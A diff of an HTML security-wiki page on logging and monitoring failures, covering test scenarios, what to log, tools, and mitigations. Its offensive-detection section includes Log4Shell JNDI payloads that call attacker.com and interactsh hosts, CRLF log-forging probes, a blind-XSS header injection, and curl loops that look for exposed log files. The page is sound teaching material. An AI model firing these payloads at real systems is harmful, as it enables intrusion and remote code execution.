-<td>Delete log file as low-privilege web user</td>
-<td>Action denied; attempt itself logged</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Scenario</th>
+					<th>Action</th>
+					<th>Expected Outcome</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Brute Force Detection</td>
+					<td>20+ failed logins on one account</td>
+					<td>Alert triggered in SIEM / SOC dashboard</td>
+			</tr>
+			<tr>
+					<td>CRLF Injection</td>
+					<td>Inject <code>%0d%0a</code> in URL parameter</td>
+					<td>Forged log entry appears in log output</td>
+			</tr>
+			<tr>
+					<td>Blind XSS via Log</td>
+					<td>Inject <code>&lt;script&gt;</code> in <code>User-Agent</code></td>
+					<td>Payload fires when analyst views log dashboard</td>
+			</tr>
+			<tr>
+					<td>Log Flooding</td>
+					<td>100,000 junk requests in rapid succession</td>
+					<td>Real events pushed out of retention window</td>
+			</tr>
+			<tr>
+					<td>Exposed Log Path</td>
+					<td>Probe <code>/logs/app.log</code>, <code>/storage/logs/</code></td>
+					<td>Log file directly accessible over HTTP</td>
+			</tr>
+			<tr>
+					<td>Log4Shell</td>
+					<td><code>${jndi:ldap://attacker.com/x}</code> in <code>User-Agent</code></td>
+					<td>DNS/LDAP callback confirms RCE vector</td>
+			</tr>
+			<tr>
+					<td>Sensitive Data in Logs</td>
+					<td>Perform login; inspect resulting log entry</td>
+					<td>No passwords, tokens, or PII visible</td>
+			</tr>
+			<tr>
+					<td>Log Deletion</td>
+					<td>Delete log file as low-privilege web user</td>
+					<td>Action denied; attempt itself logged</td>
+			</tr>
+	</tbody>
 </table>
-<h2 id="what-should-be-logged">
-  What Should Be Logged
-  <a class="anchor" href="#what-should-be-logged">#</a>
-</h2>
+<h2 id="what-should-be-logged">What Should Be Logged<a class="anchor" href="#what-should-be-logged">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Event Category</th>
-<th>Critical Data Points</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>Authentication</strong></td>
-<td>Success, failure (with reason), logout, MFA attempts, lockouts</td>
-</tr>
-<tr>
-<td><strong>Access Control</strong></td>
-<td>Authorization failures (<code>401</code>/<code>403</code>), role/permission changes</td>
-</tr>
-<tr>
-<td><strong>Data Access</strong></td>
-<td>PII/PHI records read, exported, or modified in bulk; who, when, from where</td>
-</tr>
-<tr>
-<td><strong>Input Validation</strong></td>
-<td>Malformed requests, injection payloads, anomalous sizes or encoding</td>
-</tr>
-<tr>
-<td><strong>Critical Actions</strong></td>
-<td>Password/email/MFA reset, API key generation/revocation, admin actions</td>
-</tr>
-<tr>
-<td><strong>Error &amp; Exceptions</strong></td>
-<td>Unhandled exceptions, stack traces (sanitized), repeated error patterns</td>
-</tr>
-<tr>
-<td><strong>File Operations</strong></td>
-<td>File uploads (name, type, size, outcome), downloads of sensitive files</td>
-</tr>
-<tr>
-<td><strong>System Events</strong></td>
-<td>App startup/shutdown, config changes, backup/restore access</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Event Category</th>
+					<th>Critical Data Points</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>Authentication</strong></td>
+					<td>Success, failure (with reason), logout, MFA attempts, lockouts</td>
+			</tr>
+			<tr>
+					<td><strong>Access Control</strong></td>
+					<td>Authorization failures (<code>401</code>/<code>403</code>), role/permission changes</td>
+			</tr>
+			<tr>
+					<td><strong>Data Access</strong></td>
+					<td>PII/PHI records read, exported, or modified in bulk; who, when, from where</td>
+			</tr>
+			<tr>
+					<td><strong>Input Validation</strong></td>
+					<td>Malformed requests, injection payloads, anomalous sizes or encoding</td>
+			</tr>
+			<tr>
+					<td><strong>Critical Actions</strong></td>
+					<td>Password/email/MFA reset, API key generation/revocation, admin actions</td>
+			</tr>
+			<tr>
+					<td><strong>Error &amp; Exceptions</strong></td>
+					<td>Unhandled exceptions, stack traces (sanitized), repeated error patterns</td>
+			</tr>
+			<tr>
+					<td><strong>File Operations</strong></td>
+					<td>File uploads (name, type, size, outcome), downloads of sensitive files</td>
+			</tr>
+			<tr>
+					<td><strong>System Events</strong></td>
+					<td>App startup/shutdown, config changes, backup/restore access</td>
+			</tr>
+	</tbody>
 </table>
 <p>Always include in every entry: <code>timestamp</code>, <code>user ID / session ID</code>, <code>source IP</code>, <code>endpoint / URL</code>, <code>HTTP method</code>, <code>HTTP status</code>, <code>request parameters (sanitized)</code></p>
-<h2 id="detection-techniques-offensive-perspective">
-  Detection Techniques (Offensive Perspective)
-  <a class="anchor" href="#detection-techniques-offensive-perspective">#</a>
-</h2>
-<h3 id="manual-detection-confirming-logging-failures">
-  Manual Detection: Confirming Logging Failures
-  <a class="anchor" href="#manual-detection-confirming-logging-failures">#</a>
-</h3>
+<h2 id="detection-techniques-offensive-perspective">Detection Techniques (Offensive Perspective)<a class="anchor" href="#detection-techniques-offensive-perspective">#</a></h2>
+<h3 id="manual-detection-confirming-logging-failures">Manual Detection: Confirming Logging Failures<a class="anchor" href="#manual-detection-confirming-logging-failures">#</a></h3>
 <p><strong>No 4xx/5xx Logged on Abuse</strong></p>
 <pre tabindex="0"><code>Perform 50 rapid failed logins → check if any log entry exists
 Send SQLi payload → check if error or input is recorded
-If no entry → generation failure confirmed
-</code></pre><p><strong>Plaintext Sensitive Data in Logs</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Trigger a login, then read the log</span>
+If no entry → generation failure confirmed</code></pre><p><strong>Plaintext Sensitive Data in Logs</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Trigger a login, then read the log</span>
 </span></span><span style="display:flex;"><span>curl -s -X POST https://target.com/login -d <span style="color:#e6db74">&#34;username=test&amp;password=mysecret&#34;</span>
 </span></span><span style="display:flex;"><span>curl -s https://target.com/logs/app.log | grep <span style="color:#e6db74">&#34;mysecret&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># If found → credentials logged in plaintext</span>
-</span></span></code></pre></div><p><strong>CRLF Injection Confirmation</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s <span style="color:#e6db74">&#34;https://target.com/search?q=test%0d%0aFAKE+LOG+ENTRY&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># If found → credentials logged in plaintext</span></span></span></code></pre></div><p><strong>CRLF Injection Confirmation</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s <span style="color:#e6db74">&#34;https://target.com/search?q=test%0d%0aFAKE+LOG+ENTRY&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Check log output for injected line</span>
-</span></span><span style="display:flex;"><span>curl -s https://target.com/logs/app.log | grep <span style="color:#e6db74">&#34;FAKE LOG ENTRY&#34;</span>
-</span></span></code></pre></div><p><strong>Log4Shell DNS Callback</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Submit payload in User-Agent, check Burp Collaborator or interactsh for DNS hit</span>
+</span></span><span style="display:flex;"><span>curl -s https://target.com/logs/app.log | grep <span style="color:#e6db74">&#34;FAKE LOG ENTRY&#34;</span></span></span></code></pre></div><p><strong>Log4Shell DNS Callback</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Submit payload in User-Agent, check Burp Collaborator or interactsh for DNS hit</span>
 </span></span><span style="display:flex;"><span>curl -s https://target.com/ <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H <span style="color:#e6db74">&#39;User-Agent: ${jndi:ldap://YOUR.interactsh.com/test}&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># DNS hit within seconds = vulnerable</span>
-</span></span></code></pre></div><h3 id="automated-detection">
-  Automated Detection
-  <a class="anchor" href="#automated-detection">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Probe common exposed log paths</span>
+</span></span></span><span style="display:flex;"><span>  -H <span style="color:#e6db74">&#39;User-Agent: ${jndi:ldap://YOUR.interactsh.com/test}&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># DNS hit within seconds = vulnerable</span></span></span></code></pre></div><h3 id="automated-detection">Automated Detection<a class="anchor" href="#automated-detection">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Probe common exposed log paths</span>
 </span></span><span style="display:flex;"><span>wordlist<span style="color:#f92672">=(</span><span style="color:#e6db74">&#34;app.log&#34;</span> <span style="color:#e6db74">&#34;error.log&#34;</span> <span style="color:#e6db74">&#34;debug.log&#34;</span> <span style="color:#e6db74">&#34;laravel.log&#34;</span> <span style="color:#e6db74">&#34;access.log&#34;</span> <span style="color:#e6db74">&#34;system.log&#34;</span><span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> path in <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>wordlist[@]<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">do</span>
 </span></span><span style="display:flex;"><span>  code<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s -o /dev/null -w <span style="color:#e6db74">&#34;%{http_code}&#34;</span> https://target.com/logs/$path<span style="color:#66d9ef">)</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#f92672">[[</span> <span style="color:#e6db74">&#34;</span>$code<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;200&#34;</span> <span style="color:#f92672">]]</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;[EXPOSED] /logs/</span>$path<span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Test CRLF in common parameters</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Test CRLF in common parameters</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> param in q search input username; <span style="color:#66d9ef">do</span>
 </span></span><span style="display:flex;"><span>  response<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl -s <span style="color:#e6db74">&#34;https://target.com/page?</span>$param<span style="color:#e6db74">=test%0d%0aINJECTED_LINE&#34;</span><span style="color:#66d9ef">)</span>
 </span></span><span style="display:flex;"><span>  echo <span style="color:#e6db74">&#34;</span>$response<span style="color:#e6db74">&#34;</span> | grep -q <span style="color:#e6db74">&#34;INJECTED_LINE&#34;</span> <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;[CRLF VULN] param: </span>$param<span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Log4Shell mass header test via nuclei</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Log4Shell mass header test via nuclei</span>
 </span></span><span style="display:flex;"><span>nuclei -u https://target.com -t cves/2021/CVE-2021-44228.yaml
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Or manually across headers</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> header in <span style="color:#e6db74">&#34;User-Agent&#34;</span> <span style="color:#e6db74">&#34;X-Forwarded-For&#34;</span> <span style="color:#e6db74">&#34;Referer&#34;</span> <span style="color:#e6db74">&#34;X-Api-Version&#34;</span>; <span style="color:#66d9ef">do</span>
 </span></span><span style="display:flex;"><span>  curl -s https://target.com/ <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -H <span style="color:#e6db74">&#34;</span>$header<span style="color:#e6db74">: \${jndi:ldap://YOUR.interactsh.com/</span>$header<span style="color:#e6db74">}&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
-</span></span></code></pre></div><h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
+</span></span></span><span style="display:flex;"><span>    -H <span style="color:#e6db74">&#34;</span>$header<span style="color:#e6db74">: \${jndi:ldap://YOUR.interactsh.com/</span>$header<span style="color:#e6db74">}&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span></span></span></code></pre></div><h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <ul>
 <li><strong>Extended Dwell Time</strong> — Attackers operate undetected for weeks or months; average 241 days without monitoring</li>
 <li><strong>Evidence Destruction</strong> — Post-compromise log deletion eliminates forensic trail; incident response is blind</li>
@@ -1589,44 +1515,38 @@ If no entry → generation failure confirmed
 <li><strong>RCE via Insecure Logger</strong> — Log4Shell and similar vulnerabilities turn the logging layer into an execution vector</li>
 <li><strong>Compliance Violations</strong> — Insufficient audit trails breach GDPR, HIPAA, PCI-DSS, and SOC 2 requirements</li>
 </ul>
-<h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Tool</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Burp Suite (Collaborator)</td>
-<td>Blind XSS and Log4Shell DNS callback detection</td>
-</tr>
-<tr>
-<td>interactsh</td>
-<td>Out-of-band DNS/HTTP callback listener for blind injection confirmation</td>
-</tr>
-<tr>
-<td>nuclei</td>
-<td>Template-based scanning including Log4Shell and CRLF payloads</td>
-</tr>
-<tr>
-<td>ffuf</td>
-<td>Brute force exposed log file paths</td>
-</tr>
-<tr>
-<td>ELK Stack / Splunk / Graylog</td>
-<td>Centralized log aggregation and SIEM correlation (defensive)</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Tool</th>
+					<th>Purpose</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Burp Suite (Collaborator)</td>
+					<td>Blind XSS and Log4Shell DNS callback detection</td>
+			</tr>
+			<tr>
+					<td>interactsh</td>
+					<td>Out-of-band DNS/HTTP callback listener for blind injection confirmation</td>
+			</tr>
+			<tr>
+					<td>nuclei</td>
+					<td>Template-based scanning including Log4Shell and CRLF payloads</td>
+			</tr>
+			<tr>
+					<td>ffuf</td>
+					<td>Brute force exposed log file paths</td>
+			</tr>
+			<tr>
+					<td>ELK Stack / Splunk / Graylog</td>
+					<td>Centralized log aggregation and SIEM correlation (defensive)</td>
+			</tr>
+	</tbody>
 </table>
-<h2 id="mitigation--prevention">
-  Mitigation &amp; Prevention
-  <a class="anchor" href="#mitigation--prevention">#</a>
-</h2>
+<h2 id="mitigation--prevention">Mitigation &amp; Prevention<a class="anchor" href="#mitigation--prevention">#</a></h2>
 <ol>
 <li><strong>Centralized Logging</strong> — Forward all logs to a secure, append-only system (ELK, Splunk, Graylog, CloudWatch + SIEM); never store only on the application server</li>
 <li><strong>Structured Logging</strong> — Use JSON format for machine-readable, queryable, SIEM-ingestible entries</li>
@@ -1637,23 +1557,14 @@ If no entry → generation failure confirmed
 <li><strong>Patch Insecure Loggers</strong> — Log4j → upgrade to 2.17.1+; sanitize JNDI lookups; apply <code>log4j2.formatMsgNoLookups=true</code> as interim control</li>
 <li><strong>SIEM Integration</strong> — Correlate application + infrastructure + network logs; alert on anomalies across sources, not just individual events</li>
 </ol>
-<h2 id="good-to-read">
-  Good To Read
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
-<h3 id="hackerone-reports">
-  HackerOne Reports
-  <a class="anchor" href="#hackerone-reports">#</a>
-</h3>
+<h2 id="good-to-read">Good To Read<a class="anchor" href="#good-to-read">#</a></h2>
+<h3 id="hackerone-reports">HackerOne Reports<a class="anchor" href="#hackerone-reports">#</a></h3>
 <ul>
 <li><a href="https://hackerone.com/reports/1622449" target="_blank" rel="noreferrer noopener nofollow">HackerOne Internal Incident — How Logging Saved the Investigation (#1622449)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://hackerone.com/reports/503283" target="_blank" rel="noreferrer noopener nofollow">Real-Time Error Logs Leaked Through Debug Information — Slack (#503283)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://hackerone.com/reports/3178999" target="_blank" rel="noreferrer noopener nofollow">Account Takeover through SCIM Provisioning (#3178999)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 </ul>
-<h2 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References<a class="anchor" href="#references">#</a></h2>
 <ul>
 <li><a href="https://owasp.org/Top10/2021/A09_2021-Security_Logging_and_Monitoring_Failures" target="_blank" rel="noreferrer noopener nofollow">OWASP Top 10:2021 — A09: Security Logging and Monitoring Failures</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html" target="_blank" rel="noreferrer noopener nofollow">OWASP Logging Cheat Sheet</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -1670,49 +1581,62 @@ If no entry → generation failure confirmed
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Security%20Logging%20and%20Monitoring%20Failures.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Registration-Signup-Logic-Flaws/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Registration / Signup Logic Flaws</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Security-Misconfiguration/" class="flex align-center">
+        <span>Security Misconfiguration</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -1758,15 +1682,24 @@ If no entry → generation failure confirmed
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
